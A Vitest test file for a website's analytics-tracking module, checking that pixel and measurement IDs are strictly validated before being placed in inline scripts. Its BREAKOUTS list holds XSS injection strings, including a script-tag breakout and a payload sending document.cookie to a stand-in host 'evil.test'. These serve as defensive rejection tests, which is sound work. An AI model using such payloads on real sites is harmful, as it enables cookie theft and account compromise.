import { describe, expect, it } from "vitest";

import {
  DEFAULT_TRACKING,
  EVENT_NAMES,
  TRACKING_EVENTS,
  TRACKING_PROVIDERS,
  TRACKING_SPECS,
  TRACK_ATTRIBUTE,
  TRACK_VIEW_ATTRIBUTE,
  hasAnyTracking,
  resolveTracking,
  searchConsoleSpec,
  siteTrackingSchema,
  trackAttrs,
  trackViewAttrs,
  trackingFieldLabel,
  trackingScriptHosts,
} from "../tracking";

/**
 * These IDs are interpolated into inline `<script>` source on a public page, so
 * the pattern is not input hygiene — it is the security boundary. Everything
 * below exists because the alternative to a strict anchored pattern is stored
 * XSS with a text field in front of it.
 */
describe("the patterns are a security boundary", () => {
  /**
   * The exact shapes an attacker needs: anything that can terminate the string
   * literal these land in, or open a tag.
   */
  const BREAKOUTS = [
    "'",
    '"',
    "`",
    ";",
    "</script>",
    "<script>alert(1)</script>",
    "1234567890');alert(1);//",
    "G-ABCDEF');fetch('//evil.test?c='+document.cookie);//",
    "GTM-ABCDE\\'",
    "\n",
    "G-ABC DEF",
  ];

  it("refuses every breakout shape, on every provider", () => {
    for (const provider of TRACKING_PROVIDERS) {
      for (const attempt of BREAKOUTS) {
        expect(
          TRACKING_SPECS[provider].pattern.test(attempt),
          `${provider} accepted ${JSON.stringify(attempt)}`,
        ).toBe(false);
      }
    }
  });

  it("refuses them at the schema too, not only the raw pattern", () => {
    for (const attempt of BREAKOUTS) {
      expect(
        siteTrackingSchema.safeParse({ googleAnalytics: attempt }).success,
        `schema accepted ${JSON.stringify(attempt)}`,
      ).toBe(false);
    }
  });

  it("refuses them on the way back out of the database", () => {
    for (const attempt of BREAKOUTS) {
      const resolved = resolveTracking({ facebookPixel: attempt, googleTagManager: attempt });
      expect(resolved.facebookPixel).toBeUndefined();
      expect(resolved.googleTagManager).toBeUndefined();
    }
  });

  /**
   * The one that actually matters. A value written by an older, laxer build —
   * or typed straight into the database — must not reach the template. Read-time
   * validation is what guarantees that, and it is why `resolveTracking` exists
   * rather than the renderer trusting the column.
   */
  it("drops a dangerous value already sitting in the column", () => {
    const stored = { googleAnalytics: "G-REAL123');alert(1);//", googleTagManager: "GTM-ABCDE" };
    const resolved = resolveTracking(stored);

    expect(resolved.googleAnalytics).toBeUndefined();
    expect(resolved.googleTagManager).toBe("GTM-ABCDE");
  });

  it("keeps every accepted value to characters that cannot escape a string", () => {
    const resolved = resolveTracking({
      facebookPixel: "123456789012345",
      googleAnalytics: "G-ABC1234567",
      googleTagManager: "GTM-ABC1234",
      tiktokPixel: "C4ABCDEFGHIJKLMNOP",
    });

    for (const value of Object.values(resolved)) {
      expect(value).toMatch(/^[A-Za-z0-9_-]+$/);
    }
  });
});

describe("per-provider formats", () => {
  it("accepts a real Facebook pixel and rejects a non-numeric one", () => {
    expect(siteTrackingSchema.safeParse({ facebookPixel: "1234567890123456" }).success).toBe(true);
    expect(siteTrackingSchema.safeParse({ facebookPixel: "G-ABC123" }).success).toBe(false);
  });

  /**
   * Universal Analytics was switched off in 2023. Accepting a `UA-` id would
   * give a merchant a tracking screen that says it is working while nothing is
   * recorded anywhere — the worst possible outcome for a settings field.
   */
  it("takes GA4 measurement ids only, not a dead Universal Analytics one", () => {
    expect(siteTrackingSchema.safeParse({ googleAnalytics: "G-ABC1234567" }).success).toBe(true);
    expect(siteTrackingSchema.safeParse({ googleAnalytics: "UA-123456-1" }).success).toBe(false);
  });

  it("uppercases what a merchant pasted", () => {
    const parsed = siteTrackingSchema.safeParse({ googleAnalytics: "  g-abc1234567  " });
    expect(parsed.success).toBe(true);
    if (parsed.success) expect(parsed.data.googleAnalytics).toBe("G-ABC1234567");
  });

  it("does not uppercase a Search Console token, which is case-sensitive", () => {
    const token = "aBcDeF1234567890aBcDeF1234567890aBcD";
    const parsed = siteTrackingSchema.safeParse({ searchConsole: token });
    expect(parsed.success).toBe(true);
    if (parsed.success) expect(parsed.data.searchConsole).toBe(token);
  });

  it("requires the GTM- and G- prefixes the placeholders advertise", () => {
    expect(TRACKING_SPECS.googleTagManager.pattern.test("ABC1234")).toBe(false);
    expect(TRACKING_SPECS.googleTagManager.pattern.test("GTM-ABC1234")).toBe(true);
    expect(TRACKING_SPECS.googleAnalytics.pattern.test("ABC1234567")).toBe(false);
  });

  it("has a placeholder that its own pattern would accept, character class aside", () => {
    // The placeholders are format documentation, so a placeholder that could
    // never validate would be actively misleading.
    expect(TRACKING_SPECS.facebookPixel.pattern.test(TRACKING_SPECS.facebookPixel.placeholder)).toBe(
      true,
    );
    expect(TRACKING_SPECS.googleAnalytics.placeholder.startsWith("G-")).toBe(true);
    expect(TRACKING_SPECS.googleTagManager.placeholder.startsWith("GTM-")).toBe(true);
  });
});

describe("resolveTracking", () => {
  it("treats a merchant who has configured nothing as having nothing", () => {
    expect(resolveTracking(null)).toEqual(DEFAULT_TRACKING);
    expect(resolveTracking({})).toEqual(DEFAULT_TRACKING);
    expect(resolveTracking("G-ABC1234567")).toEqual(DEFAULT_TRACKING);
    expect(resolveTracking([])).toEqual(DEFAULT_TRACKING);
  });

  it("keeps the valid ids when one is wrong", () => {
    const resolved = resolveTracking({
      facebookPixel: "nonsense",
      googleAnalytics: "G-ABC1234567",
    });

    expect(resolved.facebookPixel).toBeUndefined();
    expect(resolved.googleAnalytics).toBe("G-ABC1234567");
  });

  it("ignores a provider key a newer build might add", () => {
    const resolved = resolveTracking({ snapchatPixel: "abc", googleAnalytics: "G-ABC1234567" });
    expect(Object.keys(resolved)).toEqual(["googleAnalytics"]);
  });
});

describe("hasAnyTracking", () => {
  /**
   * Decides whether the click listener mounts at all. Search Console alone is a
   * meta tag with nothing to report, so it must not drag a listener onto the
   * page with it.
   */
  it("does not count Search Console as a pixel", () => {
    expect(hasAnyTracking({ searchConsole: "aBcDeF1234567890aBcDeF1234567890aBcD" })).toBe(false);
    expect(hasAnyTracking({ googleAnalytics: "G-ABC1234567" })).toBe(true);
    expect(hasAnyTracking({})).toBe(false);
  });
});

describe("trackingScriptHosts", () => {
  it("lists only the hosts the configured providers actually load from", () => {
    expect(trackingScriptHosts({})).toEqual([]);
    expect(trackingScriptHosts({ tiktokPixel: "C4ABCDEFGHIJKLMNOP" })).toEqual([
      "https://analytics.tiktok.com",
    ]);
  });

  it("does not repeat a host two providers share", () => {
    const hosts = trackingScriptHosts({
      googleAnalytics: "G-ABC1234567",
      googleTagManager: "GTM-ABC1234",
    });
    expect(hosts.filter((h) => h === "https://www.googletagmanager.com")).toHaveLength(1);
  });
});

/**
 * The vocabulary is fixed and typed because the failure mode of ad-hoc event
 * names is silent: an agency builds a campaign on `order_click`, a later build
 * sends `orderClick`, and nobody notices until the quarter's numbers are wrong.
 */
describe("the event vocabulary", () => {
  it("maps every event for every provider", () => {
    for (const event of TRACKING_EVENTS) {
      const names = EVENT_NAMES[event];
      expect(names, event).toBeDefined();
      expect(names.ga, event).toBeTruthy();
      expect(names.meta.name, event).toBeTruthy();
    }
  });

  /**
   * `InitiateCheckout` for someone who merely clicked "Order Online" would be a
   * lie that quietly corrupts the campaign it feeds, so events with no honest
   * standard equivalent are sent as custom ones.
   */
  it("only claims a Meta standard event where an honest one exists", () => {
    expect(EVENT_NAMES.order_click.meta.standard).toBe(false);
    expect(EVENT_NAMES.reservation_start.meta.standard).toBe(false);

    expect(EVENT_NAMES.reservation_complete.meta).toEqual({ name: "Schedule", standard: true });
    expect(EVENT_NAMES.application_submit.meta).toEqual({
      name: "SubmitApplication",
      standard: true,
    });
    expect(EVENT_NAMES.form_submit.meta).toEqual({ name: "Lead", standard: true });
  });

  it("produces the attribute the delegated listener looks for", () => {
    expect(trackAttrs("order_click")).toEqual({ [TRACK_ATTRIBUTE]: "order_click" });
    expect(trackViewAttrs("form_submit")).toEqual({
      [TRACK_VIEW_ATTRIBUTE]: "form_submit",
    });
  });

  it("keeps event names free of anything that could not be a data attribute value", () => {
    for (const event of TRACKING_EVENTS) {
      expect(event).toMatch(/^[a-z_]+$/);
    }
  });
});

describe("trackingFieldLabel", () => {
  it("names each field the way the merchant sees it", () => {
    expect(trackingFieldLabel("googleAnalytics")).toBe("Google Analytics ID");
    expect(trackingFieldLabel("searchConsole")).toBe(searchConsoleSpec.label);
  });

  it("falls back to the key rather than throwing on something unexpected", () => {
    expect(trackingFieldLabel("somethingElse")).toBe("somethingElse");
  });
});
